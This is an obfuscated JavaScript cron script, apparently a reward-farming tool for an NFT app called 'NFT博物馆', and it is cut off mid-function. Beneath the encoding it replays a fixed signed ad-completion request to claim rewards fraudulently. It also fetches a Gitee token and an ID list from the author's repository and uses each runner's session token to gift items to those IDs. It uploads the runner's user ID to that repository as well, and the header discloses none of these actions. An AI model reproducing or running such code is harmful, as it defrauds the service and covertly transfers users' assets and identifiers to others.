/*

软件名称:NFT博物馆

项目注册地址:http://nftwatches.net

cron 45 18 * * * NFT.js


变量抓取:

必要变量:
变量名 soy_NFT_data
变量值 用户token&视频code2
注释:用户token抓包时域名service.nftbwg.net连接请求头上token值,code2是观看视频是域名cpu-openapi.baidu.com连接上的code2值
注意:点关口视频时提示视频缓存失败质量的是没有这个code2值的

多个号用 @ 或 # 或 换行 隔开

脚本地址:https://gitee.com/soy-tool/app-script/raw/master/app_NFT.js

*/


const $ = new Env('NFT博物馆');
const notify = $.isNode() ? require('./sendNotify') : '';

 var _0xodb='jsjiami.com.v6',_0xodb_=['_0xodb'],_0x19df=[_0xodb,'\x75\x6e\x64\x65\x66\x69\x6e\x65\x64','\x69\x73\x4e\x6f\x64\x65','\x65\x6e\x76','\x73\x6f\x79\x5f\x4e\x46\x54\x5f\x64\x61\x74\x61','\x6c\x6f\x67','\x6e\x61\x6d\x65','\u3011\uff1a\u672a\u586b\u5199\u76f8\u5bf9\u5e94\u7684\u53d8\u91cf','\x69\x6e\x64\x65\x78\x4f\x66','\x73\x70\x6c\x69\x74','\x67\x65\x74\x64\x61\x74\x61','\u3011\uff1a\u672a\u586b\u5199\u76f8\u5e94\u53d8\u91cf\x20\x73\x6f\x79\x5f\x4e\x46\x54\x5f\x64\x61\x74\x61','\x0a\x3d\x3d\x3d\x20\u811a\u672c\u6267\u884c\x20\x2d\x20\u5317\u4eac\u65f6\u95f4\uff1a','\x67\x65\x74\x54\x69\x6d\x65','\x67\x65\x74\x54\x69\x6d\x65\x7a\x6f\x6e\x65\x4f\x66\x66\x73\x65\x74','\x74\x6f\x4c\x6f\x63\x61\x6c\x65\x53\x74\x72\x69\x6e\x67','\x20\x3d\x3d\x3d\x0a','\x3d\x3d\x3d\u3010\u5171\x20','\x6c\x65\x6e\x67\x74\x68','\x20\u4e2a\u8d26\u53f7\u3011\x3d\x3d\x3d\x0a','\x74\x65\x78\x74\x2f\x70\x6c\x61\x69\x6e','\x6b\x65\x65\x70\x2d\x61\x6c\x69\x76\x65','\x6e\x6f\x2d\x63\x61\x63\x68\x65','\x44\x61\x6c\x76\x69\x6b\x2f\x32\x2e\x31\x2e\x30\x20\x28\x4c\x69\x6e\x75\x78\x3b\x20\x55\x3b\x20\x41\x6e\x64\x72\x6f\x69\x64\x20\x31\x30\x3b\x20\x53\x4b\x57\x2d\x41\x30\x20\x4d\x49\x55\x49\x2f\x56\x31\x31\x2e\x30\x2e\x34\x2e\x30\x2e\x4a\x4f\x59\x55\x49\x29','\x63\x70\x75\x2d\x6f\x70\x65\x6e\x61\x70\x69\x2e\x62\x61\x69\x64\x75\x2e\x63\x6f\x6d','\x69\x6e\x64\x65\x78','\x0a\u5f00\u59cb\u3010\u7b2c\x20','\x20\u4e2a\u8d26\u53f7\u4efb\u52a1\u3011','\x73\x65\x6e\x64\x4e\x6f\x74\x69\x66\x79','\x63\x61\x74\x63\x68','\x6c\x6f\x67\x45\x72\x72','\x66\x69\x6e\x61\x6c\x6c\x79','\x64\x6f\x6e\x65','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x65\x65\x2e\x63\x6f\x6d\x2f\x73\x6f\x79\x2d\x74\x6f\x6f\x6c\x2f\x61\x70\x70\x2d\x73\x63\x72\x69\x70\x74\x2f\x72\x61\x77\x2f\x6d\x61\x73\x74\x65\x72\x2f\x63\x6f\x6e\x66\x69\x67\x2f\x67\x69\x74\x5f\x74\x6f\x6b\x65\x6e\x2e\x6a\x73','\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d\x65\x2f\x39\x30\x2e\x30\x2e\x34\x34\x33\x30\x2e\x39\x33\x20\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x20\x45\x64\x67\x2f\x39\x30\x2e\x30\x2e\x38\x31\x38\x2e\x35\x31','\x67\x65\x74','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x65\x65\x2e\x63\x6f\x6d\x2f\x73\x6f\x79\x2d\x74\x6f\x6f\x6c\x2f\x61\x70\x70\x2d\x73\x63\x72\x69\x70\x74\x2f\x72\x61\x77\x2f\x6d\x61\x73\x74\x65\x72\x2f\x63\x6f\x6e\x66\x69\x67\x2f\x4e\x46\x54\x5f\x63\x6f\x64\x65\x2e\x6a\x73','\x75\x73\x65\x72','\x70\x61\x72\x73\x65','\x2d\x2d\x2d\u8d26\u53f7\x20','\x20\u83b7\u53d6\u7528\u6237\x49\x44\u3011\x3a\x20\u65e0\u6cd5\u83b7\u53d6\u5230\u6570\u636e','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x65\x65\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x76\x35\x2f\x72\x65\x70\x6f\x73\x2f\x73\x6f\x79\x2d\x74\x6f\x6f\x6c\x2f\x61\x70\x70\x2d\x73\x63\x72\x69\x70\x74\x2f\x63\x6f\x6e\x74\x65\x6e\x74\x73\x2f\x63\x6f\x6e\x66\x69\x67\x2f\x4e\x46\x54\x5f\x63\x6f\x64\x65\x2e\x6a\x73','\x4e\x46\x54\x5f\x63\x6f\x64\x65\x2e\x6a\x73','\x73\x68\x61','\x2d\x2d\x2d\u66f4\u65b0\x47\x69\x74\x65\x65\u7528\u6237\x49\x44\u3011\x3a\x20\u5df2\u5b58\u5728\x2c\u65e0\u9650\u66f4\u65b0','\x77\x61\x69\x74','\x6d\x61\x74\x63\x68','\x65\x6e\x63\x6f\x64\x65','\x2c\x7b\x22\x69\x64\x22\x3a','\x7d\x5d\x7d','\x2d\x2d\x2d\u6587\u6863\x73\x68\x61\u3011\x3a\x20\u83b7\u53d6\x47\x69\x74\x65\x65\u6587\u6863\x73\x68\x61\u5931\u8d25','\x67\x69\x74\x65\x65\x2e\x63\x6f\x6d','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e\x3b\x63\x68\x61\x72\x73\x65\x74\x3d\x75\x74\x66\x2d\x38','\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x3b\x20\x72\x76\x3a\x39\x34\x2e\x30\x29\x20\x47\x65\x63\x6b\x6f\x2f\x32\x30\x31\x30\x30\x31\x30\x31\x20\x46\x69\x72\x65\x66\x6f\x78\x2f\x39\x34\x2e\x30','\x70\x75\x74','\x7b\x22\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e\x22\x3a\x22','\x22\x2c\x22\x63\x6f\x6e\x74\x65\x6e\x74\x22\x3a\x22','\x22\x2c\x22\x73\x68\x61\x22\x3a\x22','\x22\x2c\x22\x6d\x65\x73\x73\x61\x67\x65\x22\x3a\x22\x75\x70\x64\x61\x74\x65\x22\x7d','\u66f4\u65b0\x47\x69\x74\x65\x65\u52a9\u529b\u7801\u5931\u8d25\x2c\u5f53\u524d\u7f51\u7edc\u5f02\u5e38','\x74\x68\x65\x6e','\x73\x74\x61\x74\x75\x73','\x2d\x2d\x2d\u66f4\u65b0\x47\x69\x74\x65\x65\u7528\u6237\x49\x44\u3011\x3a\x20\u66f4\u65b0\u6210\u529f','\x2d\x2d\x2d\u66f4\u65b0\x47\x69\x74\x65\x65\u7528\u6237\x49\x44\u3011\x3a\x20\u66f4\u65b0\u5931\u8d25','\x70\x6f\x73\x74','\x68\x74\x74\x70\x3a\x2f\x2f\x73\x65\x72\x76\x69\x63\x65\x2e\x6e\x66\x74\x62\x77\x67\x2e\x6e\x65\x74\x2f\x68\x6f\x6d\x65\x2f\x76\x69\x65\x77','\x73\x65\x72\x76\x69\x63\x65\x2e\x6e\x66\x74\x62\x77\x67\x2e\x6e\x65\x74','\x4b\x65\x65\x70\x2d\x41\x6c\x69\x76\x65','\x67\x7a\x69\x70','\x6f\x6b\x68\x74\x74\x70\x2f\x33\x2e\x31\x34\x2e\x39','\x20\u7528\u6237\u4fe1\u606f\u3011\x3a\u7f51\u7edc\u8bf7\u6c42\u5931\u8d25','\x20\u7528\u6237\u4fe1\u606f\u3011\x3a\x20\u7f51\u7edc\u8bf7\u6c42\u5931\u8d25','\x63\x6f\x64\x65','\x64\x61\x74\x61','\x69\x73\x53\x69\x67\x6e','\x75\x73\x65\x72\x49\x64','\x64\x61\x79\x41\x72\x74','\x62\x61\x6c\x61\x6e\x63\x65','\x73\x74\x61\x74\x75\x65\x55\x73\x65\x72\x4a\x73\x6f\x6e\x73','\x0a\x2d\x2d\x2d\u96d5\u50cf','\x73\x74\x61\x74\x75\x65\x4e\x61\x6d\x65','\u7b49\u7ea7\uff1a','\x73\x69\x64','\x20\u7528\u6237\u4fe1\u606f\u3011\x3a\x20\x0a\x2d\x2d\x2d\u7528\u6237\u6635\u79f0\uff1a','\x0a\x2d\x2d\x2d\u7528\u6237\x49\x44\uff1a','\x0a\x2d\x2d\x2d\u53ef\u8d60\u9001\u6b21\u6570\uff1a','\x0a\x2d\x2d\x2d\u5f53\u524d\x56\x49\x50\u7b49\u7ea7\x3a\x20','\x76\x69\x70\x4c\x65\x76\x65\x6c','\x0a\x2d\x2d\x2d\u4eca\u65e5\u6536\u53d6\u95e8\u7968\x3a\x20','\x20\u6b21\x0a\x2d\x2d\x2d\u96d5\u50cf\u6570\u91cf\uff1a','\x0a\x2d\x2d\x2d\u5f53\u524d\u8d44\u4ea7\u7ea6\uff1a','\x62\x61\x6c\x61\x6e\x63\x65\x55\x6e\x69\x74','\x20\u6536\u53d6\u95e8\u7968\u3011\x3a\x20\u4eca\u5929\u95e8\u7968\u5df2\u6536\u53d6\u5b8c\u6210','\x20\u7528\u6237\u4fe1\u606f\u3011\x3a\x20','\x6d\x65\x73\x73\x61\x67\x65','\x68\x74\x74\x70\x3a\x2f\x2f\x73\x65\x72\x76\x69\x63\x65\x2e\x6e\x66\x74\x62\x77\x67\x2e\x6e\x65\x74\x2f\x68\x6f\x6d\x65\x2f\x67\x69\x76\x65\x41\x72\x74\x3f\x6d\x65\x6d\x6f\x3d','\x20\u8d60\u9001\u7ec6\u80de\u3011\x3a\x20','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x65\x72\x76\x69\x63\x65\x2e\x6e\x66\x74\x62\x77\x67\x2e\x6e\x65\x74\x2f\x68\x6f\x6d\x65\x2f\x73\x69\x67\x6e\x44\x3f\x75\x73\x65\x72\x49\x64\x3d','\x26\x74\x72\x61\x6e\x73\x49\x64\x3d\x32\x30\x30\x34\x38\x37\x36\x32\x34\x30\x31\x30\x32\x37\x30\x37\x36\x39\x37\x5f\x31\x30\x31\x38\x32\x30\x35\x32\x34\x39\x37\x26\x73\x69\x67\x6e\x3d\x61\x38\x63\x37\x34\x31\x64\x61\x35\x33\x35\x33\x30\x66\x62\x66\x63\x65\x34\x36\x34\x30\x66\x63\x64\x37\x36\x31\x39\x62\x63\x66\x26\x61\x6d\x6f\x75\x6e\x74\x3d\x30\x26\x6e\x61\x6d\x65\x3d\x25\x45\x37\x25\x41\x37\x25\x41\x46\x25\x45\x35\x25\x38\x38\x25\x38\x36\x26\x65\x78\x74\x72\x61\x3d\x30\x30\x30\x30\x30\x30\x30\x30\x2d\x35\x61\x38\x38\x2d\x35\x63\x66\x63\x2d\x35\x61\x38\x38\x2d\x35\x63\x66\x63\x30\x30\x30\x30\x30\x30\x30\x30','\x44\x61\x6c\x76\x69\x6b\x2f\x32\x2e\x31\x2e\x30\x20\x28\x4c\x69\x6e\x75\x78\x3b\x20\x55\x3b\x20\x41\x6e\x64\x72\x6f\x69\x64\x20\x37\x2e\x31\x2e\x32\x3b\x20\x56\x4f\x47\x2d\x41\x4c\x30\x30\x20\x42\x75\x69\x6c\x64\x2f\x4e\x32\x47\x34\x38\x48\x29','\x69\x73\x56\x61\x6c\x69\x64','\x20\u83b7\u53d6\u95e8\u7968\u3011\x3a\x20','\x6d\x73\x67','\x68\x74\x74\x70\x3a\x2f\x2f\x73\x65\x72\x76\x69\x63\x65\x2e\x6e\x66\x74\x62\x77\x67\x2e\x6e\x65\x74\x2f\x68\x6f\x6d\x65\x2f\x67\x65\x74\x44\x61\x79\x53\x69\x67\x6e\x3f\x75\x73\x65\x72\x5f\x69\x64\x3d','\x20\u6536\u53d6\u95e8\u7968\u3011\x3a\x20\u83b7\u5f97\x20','\x65\x61\x72\x6e\x69\x6e\x67\x73','\x20\x4e\x46\x54\u5e01','\x66\x6c\x6f\x6f\x72','\x72\x61\x6e\x64\x6f\x6d','\x20\u6536\u53d6\u95e8\u7968\u3011\x3a\x20','\x68\x74\x74\x70\x3a\x2f\x2f\x73\x65\x72\x76\x69\x63\x65\x2e\x6e\x66\x74\x62\x77\x67\x2e\x6e\x65\x74\x2f\x6c\x6f\x67\x69\x6e\x2f\x6f\x66\x66\x45\x61\x72\x6e\x69\x6e\x67\x73','\x20\u6536\u53d6\u79bb\u7ebf\u5956\u52b1\u3011\x3a\x20','\x2c\u83b7\u5f97\x20','\x68\x74\x74\x70\x3a\x2f\x2f\x73\x65\x72\x76\x69\x63\x65\x2e\x6e\x66\x74\x62\x77\x67\x2e\x6e\x65\x74\x2f\x61\x73\x73\x65\x74\x2f\x6f\x75\x74','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e\x3b\x20\x63\x68\x61\x72\x73\x65\x74\x3d\x55\x54\x46\x2d\x38','\x7b\x22\x6e\x75\x6d\x62\x65\x72\x22\x3a','\x2c\x22\x6f\x75\x74\x41\x64\x64\x72\x65\x73\x73\x22\x3a\x22\x22\x2c\x22\x74\x79\x70\x65\x22\x3a\x32\x7d','\x20\u63d0\u73b0\u3011\x3a\x20','\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2b\x2f\x3d','\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74','\x63\x68\x61\x72\x41\x74','\x64\x65\x63\x6f\x64\x65','\x72\x65\x70\x6c\x61\x63\x65','\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65','\x55\x79\x70\x46\x42\x4f\x54\x6a\x73\x6a\x69\x78\x51\x79\x47\x6e\x49\x65\x61\x6d\x69\x2e\x63\x6f\x6d\x2e\x76\x36\x3d\x3d'];function _0x37d2(_0x39aa7f,_0x32c1e6){_0x39aa7f=~~'0x'['concat'](_0x39aa7f['slice'](0x0));var _0x338eb5=_0x19df[_0x39aa7f];return _0x338eb5;};(function(_0x1fb6df,_0xc90968){var _0x5769b1=0x0;for(_0xc90968=_0x1fb6df['shift'](_0x5769b1>>0x2);_0xc90968&&_0xc90968!==(_0x1fb6df['pop'](_0x5769b1>>0x3)+'')['replace'](/[UypFBOTxQyGnIe=]/g,'');_0x5769b1++){_0x5769b1=_0x5769b1^0xc245b;}}(_0x19df,_0x37d2));let NFT_count='',app_soy_NFT_data=[],user_name='',statue='',subTitle='';!(async()=>{if(typeof $request!==_0x37d2('0')){await NFT_getdata();}else{if($[_0x37d2('1')]()){if(!process[_0x37d2('2')][_0x37d2('3')]){console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('6'));return;}if(process[_0x37d2('2')][_0x37d2('3')]&&process[_0x37d2('2')][_0x37d2('3')][_0x37d2('7')]('\x40')>-0x1){app_soy_NFT_data=process[_0x37d2('2')][_0x37d2('3')][_0x37d2('8')]('\x40');}else if(process[_0x37d2('2')][_0x37d2('3')]&&process[_0x37d2('2')][_0x37d2('3')][_0x37d2('7')]('\x0a')>-0x1){app_soy_NFT_data=process[_0x37d2('2')][_0x37d2('3')][_0x37d2('8')]('\x0a');}else if(process[_0x37d2('2')][_0x37d2('3')]&&process[_0x37d2('2')][_0x37d2('3')][_0x37d2('7')]('\x23')>-0x1){app_soy_NFT_data=process[_0x37d2('2')][_0x37d2('3')][_0x37d2('8')]('\x23');}else{app_soy_NFT_data=process[_0x37d2('2')][_0x37d2('3')][_0x37d2('8')]();};}else{if(!$[_0x37d2('9')](_0x37d2('3'))){console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('a'));return;}if($[_0x37d2('9')](_0x37d2('3'))&&$[_0x37d2('9')](_0x37d2('3'))[_0x37d2('7')]('\x40')>-0x1){app_soy_NFT_data=$[_0x37d2('9')](_0x37d2('3'))[_0x37d2('8')]('\x40');}else if($[_0x37d2('9')](_0x37d2('3'))&&$[_0x37d2('9')](_0x37d2('3'))[_0x37d2('7')]('\x0a')>-0x1){app_soy_NFT_data=$[_0x37d2('9')](_0x37d2('3'))[_0x37d2('8')]('\x0a');}else if($[_0x37d2('9')](_0x37d2('3'))&&$[_0x37d2('9')](_0x37d2('3'))[_0x37d2('7')]('\x23')>-0x1){app_soy_NFT_data=$[_0x37d2('9')](_0x37d2('3'))[_0x37d2('8')]('\x23');}else{app_soy_NFT_data=$[_0x37d2('9')](_0x37d2('3'))[_0x37d2('8')]();};}}console[_0x37d2('4')](_0x37d2('b')+new Date(new Date()[_0x37d2('c')]()+new Date()[_0x37d2('d')]()*0x3c*0x3e8+0x8*0x3c*0x3c*0x3e8)[_0x37d2('e')]()+_0x37d2('f'));console[_0x37d2('4')](_0x37d2('10')+app_soy_NFT_data[_0x37d2('11')]+_0x37d2('12'));for(i=0x0;i<app_soy_NFT_data[_0x37d2('11')];i++){soy_NFT_data=app_soy_NFT_data[i][_0x37d2('8')]('\x26');soy_NFT_token=soy_NFT_data[0x0];soy_NFT_code=soy_NFT_data[0x1];soy_NFT_headers={'token':soy_NFT_token,'Content-type':_0x37d2('13'),'Connection':_0x37d2('14'),'Cache-Control':_0x37d2('15'),'User-Agent':_0x37d2('16'),'Host':_0x37d2('17')};$[_0x37d2('18')]=i+0x1;console[_0x37d2('4')](_0x37d2('19')+$[_0x37d2('18')]+_0x37d2('1a'));await soy_NFT_offEarnings();await soy_NFT_home();};if($[_0x37d2('1')]()){await notify[_0x37d2('1b')]($[_0x37d2('5')],subTitle);};})()[_0x37d2('1c')](_0x3c7248=>$[_0x37d2('1d')](_0x3c7248))[_0x37d2('1e')](()=>$[_0x37d2('1f')]());function get_gittoken(){return new Promise(_0x49d77c=>{let _0xb831dd={'\x75\x72\x6c':_0x37d2('20'),'\x68\x65\x61\x64\x65\x72\x73':{'User-Agent':_0x37d2('21')}};$[_0x37d2('22')](_0xb831dd,async(_0x43d5f8,_0x44deb7,_0x31e2ad)=>{try{gittoken=_0x31e2ad;}catch(_0x21f3a1){}finally{_0x49d77c();};});});};function get_NFT_code(_0x2ac8f7){return new Promise(_0x5d4bdc=>{let _0x30c05d={'\x75\x72\x6c':_0x37d2('23'),'\x68\x65\x61\x64\x65\x72\x73':{'User-Agent':_0x37d2('21')}};$[_0x37d2('22')](_0x30c05d,async(_0x17d1ce,_0x2a264b,_0x1f611e)=>{try{if(_0x1f611e[_0x37d2('7')](_0x37d2('24'))>-0x1){let _0x5a3416=JSON[_0x37d2('25')](_0x1f611e);git_code=_0x1f611e;if(_0x2ac8f7==0x0){for(user_list of _0x5a3416[_0x37d2('24')]){await soy_NFT_memo(user_list['\x69\x64']);}}if(_0x2ac8f7==0x1){await get_sha();}}else{console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+$[_0x37d2('18')]+_0x37d2('27'));}}catch(_0x48bb37){}finally{_0x5d4bdc();};});});};function get_sha(){return new Promise(_0x27b53f=>{let _0x44e70c={'\x75\x72\x6c':_0x37d2('28'),'\x68\x65\x61\x64\x65\x72\x73':{'User-Agent':_0x37d2('21')}};$[_0x37d2('22')](_0x44e70c,async(_0x59c24f,_0x541320,_0x990b2a)=>{try{let _0x39e042=JSON[_0x37d2('25')](_0x990b2a);if(_0x39e042[_0x37d2('5')]==_0x37d2('29')){code_sha=_0x39e042[_0x37d2('2a')];if(git_code[_0x37d2('7')](''+userId)>-0x1){console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('2b'));}else{await get_gittoken();await $[_0x37d2('2c')](0x5dc);library_code=git_code[_0x37d2('2d')](/(\S*)]}/)[0x1];let _0x212380=new Base64();update_code=_0x212380[_0x37d2('2e')](library_code+_0x37d2('2f')+userId+_0x37d2('30'));await $[_0x37d2('2c')](0x5dc);await get_gitput();}}else{console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('31'));}}catch(_0x16e404){}finally{_0x27b53f();};});});};async function get_gitput(){await axios({'\x75\x72\x6c':_0x37d2('28'),'\x68\x65\x61\x64\x65\x72\x73':{'Host':_0x37d2('32'),'Content-Type':_0x37d2('33'),'User-Agent':_0x37d2('34')},'\x6d\x65\x74\x68\x6f\x64':_0x37d2('35'),'\x64\x61\x74\x61':_0x37d2('36')+gittoken+_0x37d2('37')+update_code+_0x37d2('38')+code_sha+_0x37d2('39')})[_0x37d2('1c')](function(_0x4bb77c){console[_0x37d2('4')](_0x37d2('3a'));})[_0x37d2('3b')](function(_0x5e34ea){if(_0x5e34ea[_0x37d2('3c')]=0xc8){console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('3d'));}else{console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('3e'));}});}function soy_NFT_home(){return new Promise((_0x26c019,_0x17edb4)=>{$[_0x37d2('3f')]({'\x75\x72\x6c':_0x37d2('40'),'\x68\x65\x61\x64\x65\x72\x73':{'token':soy_NFT_token,'Host':_0x37d2('41'),'Connection':_0x37d2('42'),'Accept-Encoding':_0x37d2('43'),'User-Agent':_0x37d2('44')},'\x62\x6f\x64\x79':''},async(_0x4d3502,_0x499476,_0xb901c4)=>{try{if(_0x4d3502){console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+user_name+_0x37d2('45'));subTitle+='\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+user_name+_0x37d2('46');}else{let _0x36910c=JSON[_0x37d2('25')](_0xb901c4);if(_0x36910c[_0x37d2('47')]==0xc8){user_name=_0x36910c[_0x37d2('48')][_0x37d2('5')];adfrequency=_0x36910c[_0x37d2('48')][_0x37d2('49')];userId=_0x36910c[_0x37d2('48')][_0x37d2('4a')];ID=_0x36910c[_0x37d2('48')]['\x69\x64'];dayArt=_0x36910c[_0x37d2('48')][_0x37d2('4b')];NFT=_0x36910c[_0x37d2('48')][_0x37d2('4c')];if(!user_name){user_name=$[_0x37d2('18')];}statue='';for(let _0x1fffdb=0x0;_0x1fffdb<_0x36910c[_0x37d2('48')][_0x37d2('4d')][_0x37d2('11')];_0x1fffdb++){statue+=_0x37d2('4e')+_0x36910c[_0x37d2('48')][_0x37d2('4d')][_0x1fffdb][_0x37d2('4f')]+_0x37d2('50')+_0x36910c[_0x37d2('48')][_0x37d2('4d')][_0x1fffdb][_0x37d2('51')]+'\x20\u7ea7';}console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+user_name+_0x37d2('52')+user_name+_0x37d2('53')+userId+_0x37d2('54')+dayArt+_0x37d2('55')+_0x36910c[_0x37d2('48')][_0x37d2('56')]+_0x37d2('57')+_0x36910c[_0x37d2('48')][_0x37d2('49')]+_0x37d2('58')+_0x36910c[_0x37d2('48')][_0x37d2('4d')][_0x37d2('11')]+_0x37d2('59')+_0x36910c[_0x37d2('48')][_0x37d2('5a')]+statue);subTitle+='\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+user_name+_0x37d2('52')+user_name+_0x37d2('55')+_0x36910c[_0x37d2('48')][_0x37d2('56')]+_0x37d2('57')+_0x36910c[_0x37d2('48')][_0x37d2('49')]+_0x37d2('58')+_0x36910c[_0x37d2('48')][_0x37d2('4d')][_0x37d2('11')]+_0x37d2('59')+_0x36910c[_0x37d2('48')][_0x37d2('5a')]+statue;if(adfrequency<0x6){await soy_NFT_daySign();}else{console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+$[_0x37d2('18')]+_0x37d2('5b'));}if(dayArt>0x0){await get_NFT_code(0x0);}await $[_0x37d2('2c')](0x5dc);await get_NFT_code(0x1);await soy_NFT_out();}else{console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+$[_0x37d2('18')]+_0x37d2('5c')+_0x36910c[_0x37d2('5d')]);subTitle+='\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+$[_0x37d2('18')]+_0x37d2('5c')+_0x36910c[_0x37d2('5d')];}}}catch(_0x339d8f){console[_0x37d2('4')](_0x339d8f,_0x499476);}finally{_0x26c019();}});});}function soy_NFT_memo(_0x58876e){return new Promise((_0x5e4f8e,_0x5541c5)=>{$[_0x37d2('22')]({'\x75\x72\x6c':_0x37d2('5e')+_0x58876e,'\x68\x65\x61\x64\x65\x72\x73':soy_NFT_headers},async(_0x3220f6,_0x39b63d,_0x435d67)=>{try{let _0x5306b6=JSON[_0x37d2('25')](_0x435d67);if(_0x5306b6[_0x37d2('47')]==0xc8){console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+user_name+_0x37d2('5f')+_0x5306b6[_0x37d2('5d')]);}else{console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+$[_0x37d2('18')]+_0x37d2('5f')+_0x5306b6[_0x37d2('5d')]);}}catch(_0x482c04){console[_0x37d2('4')](_0x482c04,_0x39b63d);}finally{_0x5e4f8e();}});});}function soy_NFT_daySign(){return new Promise((_0x145bf8,_0x22940d)=>{$[_0x37d2('22')]({'\x75\x72\x6c':_0x37d2('60')+ID+_0x37d2('61'),'\x68\x65\x61\x64\x65\x72\x73':{'Content-type':_0x37d2('13'),'Connection':_0x37d2('14'),'Cache-Control':_0x37d2('15'),'User-Agent':_0x37d2('62'),'Host':_0x37d2('41')}},async(_0xcff9c0,_0x28a99c,_0x4f07a7)=>{try{let _0x5bcfc2=JSON[_0x37d2('25')](_0x4f07a7);if(_0x5bcfc2[_0x37d2('63')]){await soy_NFT_getDaySign();}else{console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+user_name+_0x37d2('64')+_0x5bcfc2[_0x37d2('65')]);}}catch(_0x50fb5f){console[_0x37d2('4')](_0x50fb5f,_0x28a99c);}finally{_0x145bf8();}});});}function soy_NFT_getDaySign(){return new Promise((_0x3b313f,_0x4969ec)=>{$[_0x37d2('22')]({'\x75\x72\x6c':_0x37d2('66')+ID,'\x68\x65\x61\x64\x65\x72\x73':soy_NFT_headers},async(_0x28042c,_0x5f2b57,_0x924609)=>{try{let _0x87cdb8=JSON[_0x37d2('25')](_0x924609);if(_0x87cdb8[_0x37d2('47')]==0xc8){console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+user_name+_0x37d2('67')+_0x87cdb8[_0x37d2('48')][_0x37d2('68')]+_0x37d2('69'));let _0x19cea6=Math[_0x37d2('6a')](Math[_0x37d2('6b')]()*(0x7d00-0x6d60+0x3e8)+0x6d60);await $[_0x37d2('2c')](_0x19cea6);await soy_NFT_daySign();}else{console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+$[_0x37d2('18')]+_0x37d2('6c')+_0x87cdb8[_0x37d2('5d')]);}}catch(_0x4fa6f5){console[_0x37d2('4')](_0x4fa6f5,_0x5f2b57);}finally{_0x3b313f();}});});}function soy_NFT_offEarnings(){return new Promise((_0x2e1781,_0x404e7c)=>{$[_0x37d2('22')]({'\x75\x72\x6c':_0x37d2('6d'),'\x68\x65\x61\x64\x65\x72\x73':soy_NFT_headers},async(_0x556a71,_0x632417,_0x3eeab6)=>{try{let _0x1c61f5=JSON[_0x37d2('25')](_0x3eeab6);if(_0x1c61f5[_0x37d2('47')]==0xc8){console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+user_name+_0x37d2('6e')+_0x1c61f5[_0x37d2('5d')]+_0x37d2('6f')+_0x1c61f5[_0x37d2('48')]+_0x37d2('69'));}else{console[_0x37d2('4')]('\x0a\u3010'+$[_0x37d2('5')]+_0x37d2('26')+$[_0x37d2('18')]+_0x37d2('6e')+_0x1c61f5[_0x37d2('5d')]);}}catch(_0xeddb06){console[_0x37d2('4')](_0xeddb06,_0x632417);}finally{_0x2e1781();}});});}function soy_NFT_out(){return new 